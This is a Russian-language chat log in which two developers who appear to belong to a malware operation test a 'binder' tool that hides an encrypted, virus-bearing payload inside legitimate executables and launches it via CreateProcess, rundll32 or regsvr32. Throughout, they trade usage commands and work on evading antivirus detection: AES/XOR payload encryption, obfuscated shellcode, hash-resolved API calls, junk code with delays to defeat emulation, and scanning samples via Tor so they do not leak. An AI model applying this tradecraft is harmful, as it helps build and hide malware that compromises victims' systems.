[27.08.21 11:40:48] orval:		привет
[27.08.21 11:41:19] biggie:		привет
[27.08.21 11:41:32] orval:		меня клей попросили потестить
[27.08.21 11:41:55] orval:		сбилдил, пытаюсь так собрать:
```superclue.exe --infect hello86.exe sh86.bin
[27.08.21 11:42:39] orval:		ошибку выдает
[27.08.21 11:42:57] biggie:		`sh86.bin` - pe файл?
[27.08.21 11:43:17] biggie:		ошибку, т.е. клей падает?
[27.08.21 11:44:25] orval:		не pe, шелкод
[27.08.21 11:44:41] orval:		такой вывод:
``` <<< Infect >>>
Error
[27.08.21 11:45:14] orval:		я не из той ветки взял походу
[27.08.21 11:46:55] biggie:		должен быть pe
[27.08.21 11:47:16] biggie:		в клее есть проверка pe это или нет
[27.08.21 11:47:37] biggie:		а надо еще шелкоды приклеивать?
[27.08.21 11:48:00] orval:		меня просто попросили протестировать работу
[27.08.21 11:48:47] biggie:		мы его для exe или dll делали
[27.08.21 11:48:58] orval:		понял
[27.08.21 11:49:06] orval:		там твоя ветка есть и develop
[27.08.21 11:49:12] orval:		какая рабочая?
[27.08.21 11:49:28] orval:		elroy сказал что ты правил что-то
[27.08.21 11:49:44] orval:		какая актуальней?
[27.08.21 11:50:16] biggie:		develop
[27.08.21 11:56:28] orval:		запускается через ```build.bat``` ?
[27.08.21 11:57:00] biggie:		нуда
[27.08.21 11:57:49] orval:		```build.bat 123.exe hello64.exe
Build started 27.08.2021 13:55:59,77
Системе не удается найти указанный путь.
Build  failed 27.08.2021 13:55:59,78
[27.08.21 11:59:28] biggie:		не `build.bat` это сборка, а запускать надо 'superclue\release\supercluex64.exe'
[27.08.21 11:59:53] biggie:		или  'superclue\release\supercluex86.exe'
[27.08.21 12:00:41] orval:		разрядность у клей и файлов должна совпадать?
[27.08.21 12:00:58] biggie:		нет
[27.08.21 12:01:25] biggie:		у файлов нагрузки и носителя да
[27.08.21 12:07:59] orval:		```bin\ReleaseNoLogs\superclue_x64\superclue.exe --clue 123.exe hello64.exe --method create_process --drop-path C:\Temp
 <<< Clue >>>
Error
[27.08.21 12:08:39] biggie:		`--drop-path C:\Temp\file.exe`
[27.08.21 12:09:07] biggie:		путь с именем файла должен быть
[27.08.21 12:11:41] orval:		добавил, та же ошибка
[27.08.21 12:14:49] biggie:		можешь скинуть файлы, которые клеишь?
[27.08.21 12:15:52] orval:		да, сейчас
[27.08.21 12:17:15] orval:		```Download: https://qaz.im/load/D3n79z/6fE5BZ
Delete: https://qaz.im/index.php?a=delete&q=1509202315
[27.08.21 12:18:14] orval:		нагрузка messagebox, а другой processhacker
[27.08.21 12:18:35] biggie:		а попробуй запустить клей отсюда `superclue\release\supercluex64.exe'
[27.08.21 12:19:20] biggie:		попробуй запустить клей отсюда `superclue\release\supercluex64.exe`
[27.08.21 12:20:17] orval:		у тебя файлы склеились?
[27.08.21 12:20:34] biggie:		не пробовал
[27.08.21 12:20:40] orval:		попробовал - не вышло
[27.08.21 12:21:18] biggie:		ща попробую
[27.08.21 12:21:22] orval:		единственно я собрал 141 тулзами и сдк 10.0.14393.0
[27.08.21 12:25:04] biggie:		склеилось
[27.08.21 12:25:22] biggie:		`./supercluex64.exe --clue bin\123.exe bin\hello64.exe --method create_process --drop-path C:\Temp
 <<< Clue >>>
Success`
[27.08.21 12:29:42] biggie:		у тя в папке с `supercluex64.exe` есть папка с шеллкодами и конфиг?
[27.08.21 12:33:11] biggie:		ты видишь сообщения?
[27.08.21 15:06:38] orval:		123
[27.08.21 15:06:46] orval:		123
[27.08.21 15:06:47] orval:		я так понял бинарник клея нужно собрать с помощью батника?
[27.08.21 15:13:52] biggie:		да
[27.08.21 15:14:23] biggie:		с бинарником должен быть конфиг и папка с шелкодами
[27.08.21 15:18:37] orval:		а с какими параметрами его запустить?
[27.08.21 15:21:47] biggie:		батник без параметров
[02.09.21 13:45:28] orval:		привет
[02.09.21 13:45:42] biggie:		привет
[02.09.21 13:45:51] orval:		я по поводу клея
[02.09.21 13:46:30] orval:		у меня получилось склеить, при запуске нагрузка дропается, но оригинальный файл не запускается
[02.09.21 13:46:38] orval:		я тебе тогда кидал файлы
[02.09.21 13:46:58] orval:		вот ProcessHacker не запускается, а messagebox вылетает
[02.09.21 13:47:07] orval:		у тебя запустился?
[02.09.21 13:47:31] biggie:		из консоли попробуй сапусти
[02.09.21 13:47:51] orval:		ага, сработало
[02.09.21 13:47:56] orval:		так и задумано?
[02.09.21 13:48:09] biggie:		нет
[02.09.21 13:48:34] biggie:		должно и так и так работать, я позже посмотрю
[02.09.21 13:54:31] orval:		а какие типы файлов с какими методами запуска сочитаются?
[02.09.21 13:55:10] biggie:		exe с креат процесс
[02.09.21 13:55:31] biggie:		dll c regsvr32 и rundll32
[02.09.21 13:55:52] orval:		это нагрузка, а наклеивается только на exe?
[02.09.21 13:56:01] biggie:		да
[02.09.21 14:03:49] orval:		--drop-path можно не указывать только при rundll32?
[02.09.21 14:04:23] biggie:		да
[06.09.21 10:55:00] biggie:		
[06.09.21 11:00:39] orval:		https://file.io/V6CpGxRjS1hW
[06.09.21 11:09:39] biggie:		точка входа у рандлл какая?
[06.09.21 11:28:46] orval:		Test1,Test2
[06.09.21 11:28:59] biggie:		ок
[06.09.21 18:19:12] biggie:		исправил
[06.09.21 18:20:25] orval:		хорошо, посмотрю
[06.09.21 18:20:51] orval:		в help выдает примеры:
```regsvr32 --method-args <agrs> --skeep-start <skeep_start> --timeout 2000 --drop-path <drop_path>
[06.09.21 18:21:07] orval:		разве аргументы в этом методе возможно передать?
[06.09.21 18:21:27] biggie:		да
[06.09.21 18:21:35] biggie:		должны передаваться
[06.09.21 18:22:24] orval:		```Regsvr32 [/u] [/n] [/i[:строка_команд]] DLL-файл

/u — отменяет регистрацию сервера

/i — вызывает DllInstall, передавая ей в параметре необязательную строку_команд; при использовании с ключом /u вызывает DllUnInstall.
/n — не вызывает DllRegisterServer; это может использоваться с ключом /i

/s – "тихий" режим; окна сообщений не отображаются
[06.09.21 18:23:06] orval:		это в оффа
[06.09.21 18:23:21] biggie:		`/u /n /s ` это же аргументы
[06.09.21 18:23:59] biggie:		или их командами считать?
[06.09.21 18:24:51] orval:		да я думаю так правильно
[06.09.21 18:24:55] orval:		как ты сказал
[06.09.21 18:25:01] orval:		хорошо, я посмотрю
[08.09.21 11:47:12] orval:		привет
[08.09.21 11:47:23] biggie:		привет
[08.09.21 11:47:44] orval:		x86 не получилось ничего склеить
[08.09.21 11:48:31] orval:		и regsvr аргументы как-то не передаются нужным образом
[08.09.21 11:48:40] orval:		если имелось ввиду так как мы обсуждали
[08.09.21 11:48:56] biggie:		окей
[08.09.21 11:49:17] biggie:		ща исправлю
[08.09.21 11:52:53] biggie:		скинь x86, которые не склеились
[08.09.21 11:55:49] orval:		cек
[08.09.21 11:58:27] orval:		и еще вопрос
[08.09.21 11:58:39] orval:		нагрузка из памяти запускается?
[08.09.21 11:59:23] biggie:		если метод rundll32 и нет пути сброса, то из памяти - иначе с диса
[08.09.21 12:00:00] orval:		а create_process?
[08.09.21 12:00:07] biggie:		с диска
[08.09.21 12:00:24] orval:		понял, просто в тз вроде так не расписано
[08.09.21 12:01:20] biggie:		там все из памяти не получается запустить
[08.09.21 12:01:36] biggie:		rundll только получилось
[08.09.21 12:03:36] orval:		и еще параметр --skeep-start не работает
[08.09.21 12:04:21] biggie:		точно не работает?
[08.09.21 12:05:29] biggie:		ладно еще раз протестю
[08.09.21 12:06:17] orval:		должна только нагрузка запускаться?
[08.09.21 12:06:47] biggie:		да
[08.09.21 12:07:43] orval:		вот не работало у меня
[08.09.21 12:08:17] orval:		https://file.io/YjvHZTJ96Kc3
[08.09.21 12:08:37] orval:		на calc.exe я тестил x86
[08.09.21 12:08:49] orval:		еще на всякий autorun.exe закинул
[08.09.21 14:44:46] biggie:		в rundll86 точка входа test?
[08.09.21 14:50:09] orval:		Test1
[10.09.21 09:27:12] biggie:		привет. поправил
[10.09.21 09:41:35] orval:		привет
[10.09.21 09:41:46] orval:		отлично, посмотрю
[13.09.21 12:23:44] orval:		ну и skeep по другому пишется)
[13.09.21 12:24:36] biggie:		skip)
[13.09.21 12:24:48] orval:		ага
[13.09.21 12:25:30] orval:		добавь тогда еще что нужны python и cmake и то как собирается и где бинарники оказываются
[13.09.21 12:26:14] orval:		ну в общем должна ведь в этом файле быть инструкция полная с 0, как на гите у проектов
[13.09.21 12:26:50] biggie:		ага
[13.09.21 13:00:09] orval:		а методом regsvr запускается?
[13.09.21 13:00:36] orval:		я в --method-args передаю /i
[13.09.21 13:00:43] orval:		и не запускается
[13.09.21 13:01:56] orval:		и carrier-file во всех случаях exe?
[13.09.21 13:02:35] biggie:		нет только в create_process
[13.09.21 13:03:51] biggie:		попробуй `"/i"`
[13.09.21 13:04:00] biggie:		в кавычках
[13.09.21 13:04:18] orval:		методом regsvr32 я клею dll и dll только?
[13.09.21 13:04:39] biggie:		не exe и dll
[13.09.21 13:05:55] orval:		не запускается методом regsvr32 нагрузка
[13.09.21 13:06:13] orval:		как ты делал?
[13.09.21 13:07:55] biggie:		`./supercluex64 --clue bin/hello86.exe bin/regsvr86.dll --method regsvr32 --drop-path d:\1.exe --timeout 1000 --skeep-start aa --method-args "/i"`
[13.09.21 13:09:20] biggie:		запустилась?
[13.09.21 13:10:42] orval:		нет
[13.09.21 13:14:14] biggie:		там в конце должно быть сообщение `Успешное выполнение DllRegisterserver and Dllinstall в 1.exe` ?
[13.09.21 13:15:12] orval:		да, и еще мои messagebox-ы
[13.09.21 13:15:25] orval:		из этих функций
[13.09.21 13:15:46] orval:		ну по крайней мере так работает запуск из cmd
[13.09.21 13:16:03] biggie:		messagebox-ы до этого сообщения?
[13.09.21 13:16:09] orval:		да
[13.09.21 13:16:21] biggie:		нуда были
[13.09.21 13:16:28] biggie:		а у тебя ничего?
[13.09.21 13:17:17] biggie:		может ты не первый раз в этот .exe клеишь?
[13.09.21 13:21:28] orval:		нет каждый раз новый
[13.09.21 13:21:38] orval:		пишет что не найден указанный модуль
[13.09.21 13:24:00] biggie:		`--drop-path d:\1.dll`
[13.09.21 13:24:21] biggie:		у меня уже был по этому пути 1.dll, поэтому не ругался
[13.09.21 13:25:43] orval:		а в итоге?
[13.09.21 13:26:24] biggie:		`./supercluex64 --clue bin/hello86.exe bin/regsvr86.dll --method regsvr32 --drop-path d:\1.dll --timeout 1000 --skeep-start aa --method-args "/i"`
[13.09.21 13:27:52] orval:		запустилось у тебя?
[13.09.21 13:28:17] biggie:		нуда
[13.09.21 13:29:52] orval:		у меня ошибку выдает
[13.09.21 13:30:13] biggie:		при склеивании?
[13.09.21 13:30:24] orval:		не
[13.09.21 13:30:29] orval:		при запуске файла
[13.09.21 13:30:33] orval:		пишет что модуль не найден
[13.09.21 13:31:18] biggie:		какой модуль не пишет?
[13.09.21 13:31:59] biggie:		по пути `d:\1.dll` 1.dll есть?
[13.09.21 13:32:54] biggie:		`--drop-path` у тя какой?
[13.09.21 13:39:23] orval:		C:\Temp\1.dll
[13.09.21 13:41:21] biggie:		да ошибка из-за пути
[13.09.21 13:44:24] biggie:		попробую поправить
[13.09.21 14:02:50] biggie:		поправил
[13.09.21 14:03:04] orval:		вообще все?
[13.09.21 14:03:19] biggie:		а стоп
[13.09.21 14:03:19] biggie:		пока нет
[13.09.21 14:03:19] biggie:		сек
[16.09.21 10:36:18] orval:		привет
[16.09.21 10:36:34] biggie:		привет
[16.09.21 10:36:44] orval:		есть успехи по клею?
[16.09.21 10:36:54] biggie:		да ща тестирую
[16.09.21 10:37:06] orval:		хорошо
[16.09.21 11:21:03] biggie:		сейчас все должно работать
[16.09.21 11:21:15] biggie:		обновил гит
[16.09.21 11:39:51] orval:		посмотрю
[16.09.21 11:40:05] orval:		regsvr32 тоже запустилось?
[16.09.21 11:40:30] biggie:		да
[17.09.21 13:21:52] orval:		приветэ
[17.09.21 13:22:06] biggie:		привет
[17.09.21 13:22:23] orval:		клей x86 должен клеить x64 файлы?
[17.09.21 13:22:33] biggie:		да
[17.09.21 13:23:19] biggie:		не клеит?
[17.09.21 13:24:02] orval:		клеит, но skeep-start не работает
[17.09.21 13:24:27] biggie:		там теперь --skip-start
[17.09.21 13:25:44] orval:		а таймаут при скипе соблюдаться должен?
[17.09.21 13:26:40] biggie:		про это не было написано в задании, я сделал без таймаута
[17.09.21 13:26:57] orval:		хорошо
[17.09.21 13:27:07] biggie:		могу переделать
[17.09.21 13:28:05] orval:		я не знаю как правильно
[17.09.21 13:28:23] orval:		скип старт работает
[17.09.21 13:28:35] orval:		в хелпе название флага старое
[17.09.21 13:28:53] orval:		а нет
[17.09.21 13:28:55] orval:		все четко
[17.09.21 14:13:47] orval:		у метода regsvr32 параметр method-args обязательный?
[17.09.21 14:14:26] biggie:		нет
[17.09.21 14:18:50] orval:		когда regsvr без --method-args нет надписи Success и нагрузка не запускается
[17.09.21 14:18:56] orval:		у x86 клея
[17.09.21 14:19:13] orval:		```supercluex86.exe --clue Autoruns.exe payloads\regsvr86.dll --method regsvr32 --timeout 2000 --drop-path C:\Temp\13.exe
 <<< Clue >>>
[17.09.21 14:19:43] biggie:		ок
[17.09.21 14:25:29] biggie:		исправил
[20.09.21 12:02:58] biggie:		привет
[20.09.21 12:03:05] orval:		привет
[20.09.21 12:03:08] biggie:		я поправил ошибку
[20.09.21 12:03:22] orval:		с regsvr без параметров?
[20.09.21 12:03:28] biggie:		да
[20.09.21 12:03:39] orval:		хорошо, я сегодня посмотрю
[22.09.21 10:22:55] orval:		привет
[22.09.21 10:23:24] biggie:		фвафа
[22.09.21 10:23:27] biggie:		привет
[22.09.21 10:24:14] orval:		в методе regsvr32 c использованием параметра skip-start после отработки нагруки процесс просто висит
[22.09.21 10:24:39] orval:		те после отработки нагрузки нормальный процесс не завершается
[22.09.21 10:24:54] orval:		в create_process завершался
[22.09.21 10:25:27] biggie:		regsvr32 с дропом или без?
[22.09.21 10:25:43] biggie:		а это rundll
[22.09.21 10:27:54] orval:		везде с дропом ведь, только в rundll возможно без?
[22.09.21 10:28:10] biggie:		да я перепутал их
[22.09.21 10:29:18] orval:		быстро поправишь?
[22.09.21 10:31:02] biggie:		щас попробовал hello86 склеить, закрыл окно   hello86 и процесс пропал
[22.09.21 10:31:22] orval:		да, я ведь и написал что в create_process все норм
[22.09.21 10:31:37] orval:		у regsvr32 такое
[22.09.21 10:31:48] biggie:		я regsvr32 клеил
[22.09.21 10:32:34] biggie:		а какие файлы клеишь?
[22.09.21 10:34:59] orval:		в create_process Autoruns.exe и hello86, после завершения hello86 как нагрузки Autoruns тоже завершается или вообще не запускался
[22.09.21 10:35:32] orval:		в regsvr32 Autoruns.exe и regsvr86.dll после завершения regsvr86.dll как нагрузки Autoruns висит в процессах
[22.09.21 10:45:41] orval:		все так?
[22.09.21 10:46:07] biggie:		ща
[22.09.21 10:46:13] biggie:		сек
[22.09.21 10:52:55] biggie:		пути сброса у тя какие?
[22.09.21 10:53:02] biggie:		--drop-path
[22.09.21 10:53:23] orval:		123
[22.09.21 10:53:40] biggie:		ага
[22.09.21 10:53:45] orval:		```supercluex86.exe --clue Autoruns.exe payloads\regsvr86.dll --method regsvr32 --skip-start s --timeout 3000 --drop-path C:\Temp\reg\1.dll
[22.09.21 11:07:07] biggie:		щас добавил messagebox в шелкод, потом пересобрал - заработало с messageboxom, потом удалил его, собрал и все заработало. Возможно какой-то из шеллкодов не перекопировался после сборки
[22.09.21 11:09:05] orval:		мне проект заново скачать или просто пересобрать его?
[22.09.21 11:09:28] biggie:		ща у себя попробую скачать и собрать
[22.09.21 11:17:10] biggie:		попробуй скачать заново и собрать, должно заработать
[22.09.21 11:21:39] orval:		повтори
[22.09.21 11:22:57] biggie:		попробуй скачать заново и собрать, должно заработать
[22.09.21 11:23:10] orval:		хорошо
[22.09.21 11:49:01] biggie:		заработало?
[22.09.21 11:52:12] orval:		нет
[22.09.21 11:52:33] orval:		Autoruns.exe висит в процессах после выполнения нагрузки
[22.09.21 11:53:05] biggie:		так он и должен висеть
[22.09.21 11:53:13] biggie:		если его не трогать
[22.09.21 11:53:26] biggie:		после закрытия висит?
[22.09.21 11:53:46] biggie:		или интерфейс не реагирует?
[22.09.21 11:54:02] orval:		я запустил с флагом --skip-start
[22.09.21 11:54:09] orval:		нагрузка отработала
[22.09.21 11:54:14] orval:		процесс остался
[22.09.21 11:56:56] orval:		он ведь не должен висеть?
[22.09.21 11:57:56] biggie:		не должен
[22.09.21 11:58:43] biggie:		а без флага все работает?
[22.09.21 11:59:18] orval:		может управление криво как-то передается
[22.09.21 12:00:01] orval:		работает
[22.09.21 12:00:06] orval:		но я не все протестировал
[22.09.21 12:04:54] biggie:		да висит. ща поправлю
[22.09.21 12:13:24] orval:		когда методом regsvr32 нагрузка запускается, то создается отдельный процесс regsvr32.exe
а когда rundll32 с дампом, то отдельный процесс не создается
[22.09.21 12:14:40] orval:		не знаю как надо
[22.09.21 12:15:17] biggie:		в случае с rundll32 вызывается loadlibrary и getprocaddress
[22.09.21 12:16:06] orval:		понял
[22.09.21 12:16:42] biggie:		а в случае regsvr32 вызывается ShellExecuteA
[22.09.21 12:17:58] orval:		а в случае create_process ?
[22.09.21 12:18:16] biggie:		CreateProcessW
[22.09.21 12:20:34] orval:		и получается если запуск был методом create_process то в случае смерти родительского процесса, дочерний работает
а в случае rundll32 умрут все
[22.09.21 12:20:56] biggie:		нуда
[22.09.21 12:21:38] orval:		я просто не знаю как задумывалось, если так то окей
[22.09.21 12:22:35] biggie:		время жизни нагрузки не было оговорено
[22.09.21 12:22:52] orval:		хорошо
[22.09.21 12:23:16] orval:		а кто принять проект должен?
[22.09.21 12:23:42] biggie:		хз задание писал сильвер, тимлид элрой
[22.09.21 12:26:30] orval:		понял
[22.09.21 13:09:05] biggie:		исправил
[22.09.21 13:09:15] biggie:		exitprocess добавил
[22.09.21 13:13:35] orval:		сейчас посмотрю
[22.09.21 14:41:28] orval:		на детекты ав проверял?
[22.09.21 14:41:41] biggie:		нет
[22.09.21 15:36:39] orval:		все работает
[22.09.21 15:37:00] biggie:		заебись
[22.09.21 15:37:12] orval:		но надо еще на детекты проверить
[22.09.21 15:37:34] biggie:		в нагрузке должны быть вирусы?
[22.09.21 15:37:53] orval:		да
[22.09.21 15:38:30] biggie:		можешь скинуть?
[22.09.21 15:39:07] orval:		на динчек есть доступ
[22.09.21 15:39:10] orval:		?
[22.09.21 15:40:10] biggie:		неа
[22.09.21 15:43:04] orval:		я тогда протестирую
[22.09.21 15:43:12] orval:		если будут детекты тогда будем думать
[22.09.21 15:43:21] biggie:		ок
[22.09.21 16:11:53] biggie:		а ты здесь долго работаешь?
[22.09.21 16:13:18] orval:		год
[22.09.21 16:14:26] biggie:		есть ли такие, к кому пришел товарищ майор?
[22.09.21 16:14:44] biggie:		и их посадили
[22.09.21 16:15:29] orval:		не слышал)
[22.09.21 16:15:42] biggie:		это радует)
[22.09.21 16:17:08] orval:		главное соблюдай правила безопасности и все нормально будет
[22.09.21 16:17:31] biggie:		ок)
[22.09.21 16:18:06] orval:		детект на x86 create_process есть
[22.09.21 16:18:11] orval:		по статике
[22.09.21 16:18:28] orval:		действия по устранению детектов обсуждались?
[22.09.21 16:19:33] biggie:		не обсуждались
[22.09.21 16:20:02] biggie:		есть ли детекты по rundll32 без сброса
[22.09.21 16:20:17] biggie:		нагрузки?
[22.09.21 16:20:47] biggie:		create_process же тупо сбрасывает на диск и запускает...
[22.09.21 16:21:11] orval:		сейчас проверю
[22.09.21 16:27:10] orval:		тоже есть
[22.09.21 16:27:14] orval:		это ведь статика
[22.09.21 16:28:06] orval:		с сильвером я смогу только в пятницу переговорить
[22.09.21 16:28:23] orval:		за ксорить нагрузку сложно будет?
[22.09.21 16:28:49] biggie:		нагрузка аесом зашифрована
[22.09.21 16:28:58] orval:		даже так)
[22.09.21 16:29:54] biggie:		шелкоды обфусцированы
[22.09.21 16:30:01] orval:		ты сегодня долго еще будешь?
[22.09.21 16:30:11] biggie:		до 10 буду
[22.09.21 16:31:29] biggie:		по детектам все плохо?
[22.09.21 16:33:01] orval:		не все еще проверил
[22.09.21 16:33:10] orval:		не так плохо все
[22.09.21 16:37:14] orval:		причем детект на обычную нагрузку тоже
[22.09.21 16:37:26] orval:		x86 как всегда говнистая хрень
[22.09.21 16:38:17] orval:		крипто функции вызываешь явно?
[22.09.21 16:38:25] biggie:		да
[22.09.21 16:38:27] orval:		или вообще
[22.09.21 16:38:35] orval:		но это может быть детект
[22.09.21 16:39:00] orval:		кто сказал аесом шифровать?
[22.09.21 16:39:05] biggie:		переделать шифрование без вызова винапи?
[22.09.21 16:39:28] biggie:		я сам выбрал т.к. элрой сказал любым способом
[22.09.21 16:39:45] orval:		а долго переделывать?
[22.09.21 16:40:12] biggie:		сегодня-завтра
[22.09.21 16:40:18] biggie:		могусделать
[22.09.21 16:40:50] biggie:		как шифрование лучше сделать?
[22.09.21 16:41:28] orval:		а как ты явно их вызываешь если в исходнике нет их?
[22.09.21 16:42:09] biggie:		есть, я их адреса ищу по хешу и вызываю
[22.09.21 16:42:28] orval:		а в какой dll они?
[22.09.21 16:43:20] biggie:		ADVAPI32.dll
[22.09.21 16:43:59] orval:		а предварительно LoadLibrary делаешь?
[22.09.21 16:44:14] biggie:		для них нет
[22.09.21 16:44:28] orval:		просто она может и не подгружаться автоматом
[22.09.21 16:45:14] biggie:		xorа будет достаточно для шифрования?
[22.09.21 16:45:24] orval:		да я думаю лучше xor
[22.09.21 16:45:50] biggie:		для пути сброса xor тоже подойдет?
[22.09.21 16:46:20] orval:		да
[22.09.21 16:47:11] orval:		а как сам думаешь, в этом дело?
[22.09.21 16:48:26] biggie:		хз, можно проверить
[22.09.21 16:49:27] orval:		просто чтобы это пустой тратой времени не было
[22.09.21 16:50:06] biggie:		ща запилю
[22.09.21 17:02:24] orval:		только вариант с прежним шифрованием далеко не убирай
[22.09.21 17:03:35] orval:		тут еще от исходного файла может зависить
[22.09.21 17:03:39] orval:		наверное
[22.09.21 17:05:19] orval:		да в зависимости от исходного файла детекты меняются
[22.09.21 17:05:25] orval:		но все равно есть(
[22.09.21 17:06:44] orval:		а вообще конечно у сильвера надо уточнить еще
[22.09.21 17:12:38] orval:		я на 2 часа отойду, если ты исправишь я проверю сегодня, завтра поздно буду, так что в пятницу только получится добить
[22.09.21 18:15:33] biggie:		готово
[22.09.21 18:33:59] biggie:		а детект происходит при запуске?
[22.09.21 19:54:06] orval:		пока только на статику смотрел
[22.09.21 19:54:13] orval:		те он не запускается
[22.09.21 19:54:55] orval:		динамика еще в переди
[22.09.21 19:55:52] biggie:		нучо с xor есть разница?
[22.09.21 19:57:53] orval:		сейчас
[22.09.21 20:05:36] orval:		все равно есть
[22.09.21 20:08:00] orval:		нагрузка в отдельном потоке выполняется?
[22.09.21 20:08:13] biggie:		да
[22.09.21 20:08:44] orval:		форк прям в начале выполнения основного файла идет?
[22.09.21 20:10:19] orval:		если что вот https://dyncheck.com/scan/id/bba42c92a66f9f8756b08839bfa672bf
[22.09.21 20:11:13] orval:		разместить все в секции .text нет возможности?
[22.09.21 20:11:26] biggie:		сначала находится адреса функций, потом структура с адресами шелкодов по сигнатуре, потом проверяются аргументы ком строки и создается поток
[22.09.21 20:12:00] biggie:		для каждого шелкода создается новая секция
[22.09.21 20:12:55] orval:		по ходу выполнения кода после вызова точки входа, форк сразу идет?
[22.09.21 20:13:15] biggie:		нет
[22.09.21 20:13:47] biggie:		надо сразу?
[22.09.21 20:14:17] orval:		нет, наоборот нужно как можно дальше оттягивать расшифровку нагрузки
[22.09.21 20:14:49] biggie:		расшифровка в потоке происходит
[22.09.21 20:15:22] orval:		сразу после старта потока?
[22.09.21 20:16:10] biggie:		нет
[22.09.21 20:16:23] orval:		а что перед стартом происходит?
[22.09.21 20:16:29] orval:		точнее сразу после
[22.09.21 20:16:46] biggie:		сначала находится адреса winapi функций, потом структура с адресами шелкодов по сигнатуре, потом проверяются аргументы ком строки
[22.09.21 20:17:04] biggie:		потом расшифровка
[22.09.21 20:20:43] orval:		а шелкоды что делают?
[22.09.21 20:21:32] biggie:		1 сооздает поток, 2 расшифровывает нагрузку, 3 запускает нагрузку
[22.09.21 20:22:27] orval:		а где sleep стоит?
[22.09.21 20:22:48] biggie:		в шелкодах происходит поиск неиспользуемых функций по адресу и по названию, это может повлиять?
[22.09.21 20:23:03] biggie:		sleep во 2 шелкоде
[22.09.21 20:23:12] orval:		это не долно влиять
[22.09.21 20:23:51] orval:		ну подожди
[22.09.21 20:24:08] orval:		код в каком порядке выполняется
[22.09.21 20:24:27] biggie:		сначала 1 птом 2 потом 3
[22.09.21 20:24:48] orval:		sleep в функции потока?
[22.09.21 20:24:55] biggie:		да
[22.09.21 20:25:28] orval:		адреса всех шелкодов находишь перед созданием потока?
[22.09.21 20:25:36] biggie:		да
[22.09.21 20:25:52] biggie:		и внутри потока тоже
[22.09.21 20:26:17] orval:		внутри потока 2 шелкод находишь?
[22.09.21 20:26:59] biggie:		да
[22.09.21 20:27:26] orval:		можно попробовать добавить мусорный код в самом начале функции потока
[22.09.21 20:28:09] orval:		и чтобы у него было естественная задержка
[22.09.21 20:28:16] biggie:		цикл?
[22.09.21 20:29:09] biggie:		если шелкоды на c++ написать, это что то даст?
[22.09.21 20:29:22] orval:		всм?
[22.09.21 20:29:52] biggie:		ну они сейчас на c написаны
[22.09.21 20:32:10] biggie:		размеры шелкода написанного на с и c++ отличаются
[22.09.21 20:33:50] orval:		например такой код:
смотришь все файлы в системной директории, выбираешь один случайным образом по размеру или еще чему нибудь
читаешь его в буфер, потом модифицируешь буфер случайным образом
выбираешь рандомный большой кусок из этого буфера 
выбираешь рандомный ключ реестра чтобы он был заранее неправильный (просто мусор)
в цикле идешь по буферу, выбираешь из него подкусок и сравниваешь значение реестра с этим куском
если совпало то флаг = true
в коцне смотришь если флаг false то расшифровываешь и запускаешь нагрузку
[22.09.21 20:33:59] orval:		чето такое)
[22.09.21 20:34:22] orval:		ав может прокручивать при анализе твой код и авансом расшифровать нагрузку
[22.09.21 20:34:28] orval:		при этом опуская слипы
[22.09.21 20:35:03] biggie:		ок, завтра попробую
[22.09.21 20:35:40] orval:		часть детектов которые сейчас есть совпадают по названию с детектами которые дает сама нагрузка, это все не точно, но тут вообще нельзя точно ничего сказать
[22.09.21 20:35:53] orval:		надо пробовать
[22.09.21 20:36:12] orval:		но вообще по борьбе со статикой это точно одна из рекомендаций
[22.09.21 20:36:27] orval:		добавить вначале задержку и чтобы она была естественной
[22.09.21 20:36:49] orval:		я просто пример привел, как это делал я
[22.09.21 20:37:16] orval:		помню в какой то момент именно это и помогло
[22.09.21 20:37:28] orval:		не факт что сейчас такой же случай
[22.09.21 20:41:50] orval:		хотя я вот сейчас думаю, на обычную нагрузку тоже детекты
[22.09.21 20:41:59] orval:		так что может сам механизм запуска дает
[22.09.21 20:41:59] biggie:		т.е. нагрузка не всегда будет запускаться?
[22.09.21 20:42:17] orval:		почему?
[22.09.21 20:43:22] biggie:		`в коцне смотришь если флаг false то расшифровываешь и запускаешь нагрузку` а если true то нагрузка не запустится или если флаг false, то она запустится 2 раза?
[22.09.21 20:44:11] orval:		не, запускается только если false
[22.09.21 20:44:42] orval:		или если false то exitthread
[22.09.21 20:45:01] orval:		точнее если true
[22.09.21 20:45:07] orval:		иначе расшифровываешь
[22.09.21 20:45:16] orval:		ты можешь свой код придумать
[22.09.21 20:45:20] biggie:		может быть что это из-за созданий новых секций в pe файле?
[22.09.21 20:45:49] orval:		может и это, но маловероятно
[22.09.21 20:46:00] orval:		я увидел только одну новую секцию
[22.09.21 20:46:49] orval:		но то что у нее права execute это стремно
[22.09.21 20:47:10] orval:		тебе конечно доступ на динчек нужен
[22.09.21 20:47:24] biggie:		изменение алгоритма обфускации может что то дать?
[22.09.21 20:47:53] orval:		скорее всего дело не в этом
[22.09.21 20:49:14] orval:		так давай я тебе все скину а то завтра поздно буду
[22.09.21 20:49:27] orval:		нагрузку и доступ на динчек
[22.09.21 20:49:37] biggie:		давай
[22.09.21 20:54:27] orval:		https://privatlab.com/s/v/er7A0eV8A8uAeo49Q298
[22.09.21 20:54:41] orval:		на динчек через тор лучше заходить
[22.09.21 20:54:57] orval:		юзать только статик скан
[22.09.21 20:55:05] orval:		потому что по динамике может все слить
[22.09.21 20:55:11] orval:		да и сейчас не нужно
[22.09.21 20:55:30] orval:		но в общем на динамике проверяется только на своих тачках без доступа в инет
[22.09.21 20:55:45] orval:		с откатом снапшота
[22.09.21 20:56:17] orval:		через тор потому что при аплоаде файла тоже образец может слиться
[22.09.21 20:56:49] biggie:		окей
[22.09.21 20:56:55] biggie:		лан я спать
[22.09.21 20:57:04] orval:		ща
[22.09.21 20:57:34] orval:		можешь попробовать часть фукнционала повыкидывать чтобы понять в чем дело
[22.09.21 20:57:48] orval:		например сделать секцию свою только read
[22.09.21 20:57:58] orval:		и посмотреть что скажет скан
[22.09.21 20:58:16] orval:		части шелкодов выкидывать
[22.09.21 20:58:34] orval:		вообще есть систематизированный способ поиска места которое дает детект
[22.09.21 20:58:57] orval:		я им често говоря не пользовался потому что проще было часть кода выкинуть
[22.09.21 20:58:59] orval:		вот
[22.09.21 20:58:59] orval:		все
[22.09.21 20:59:48] orval:		спокойной ночи)\
[22.09.21 21:00:02] biggie:		ага спс)
[22.09.21 21:01:10] orval:		а вообще раз детект дает и с обычной нагрузкой то походу дело в твоих шелкодах
[22.09.21 21:01:25] orval:		так что не торопись писать код по задержки
[24.09.21 15:16:03] orval:		привет
[24.09.21 15:16:20] biggie:		привет
[24.09.21 15:16:31] orval:		есть успехи?
[24.09.21 15:17:17] biggie:		нашел шелкод, из-за которого антивирусы агрятся
